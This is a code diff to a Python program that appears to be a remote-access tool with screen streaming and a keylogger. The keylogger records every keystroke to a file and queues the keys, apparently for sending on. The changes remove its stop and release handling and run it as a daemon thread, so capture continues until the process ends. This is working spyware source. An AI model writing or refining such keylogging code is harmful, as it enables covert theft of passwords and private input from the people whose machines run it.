@@ -81,7 +81,7 @@ def moveFileFromDir(data, file):
             shutil.copy(getpath(True)+"/"+data+"/"+file[f], getpath(True))
 
 
-easyimporting.importing("PIL zipfile pyautogui lib_platform psutil pynput", 'pillow')
+easyimporting.importing("PIL zipfile pyautogui lib_platform psutil pynput keyboard", 'pillow')
 import zipfile, psutil
 try:
     import vidstream as vd
@@ -250,7 +250,7 @@ def receive(timeoutKill):
 
 QUEUKeylogger = []
 
-def keylogger(stop):
+def keylogger():
     global QUEUKeylogger
     # save all logkey in a save.txt file
     print("other")
@@ -289,18 +289,15 @@ def keylogger(stop):
             elif key.find("key") == -1:
                 QUEUKeylogger.append(key)
                 file.write(key)
-    def release(key):
-        if stop():
-            return False
-    with Listener(on_press=press, on_release=release) as listener:
+    with Listener(on_press=press) as listener:
         listener.join()
 
 sendListenKeylogger = False
-
+    
 def QueuKeyloggerEvent(stop):
     global sendListenKeylogger, QUEUKeylogger
-    stop_threads = False
-    threadingKeylogger = threading.Thread(target=keylogger, args =(lambda : stop_threads, ))
+    threadingKeylogger = threading.Thread(target=keylogger)
+    threadingKeylogger.daemon = True
     threadingKeylogger.start()
     time.sleep(0.4)
     while True:
@@ -312,8 +309,6 @@ def QueuKeyloggerEvent(stop):
             QUEUKeylogger = []
         if stop():
             break
-    stop_threads = True
-    threadingKeylogger.join()
 
 stop_Init_Keylogger = False
 threadingInitKeylogger = threading.Thread(target=QueuKeyloggerEvent, args =(lambda : stop_Init_Keylogger, ))
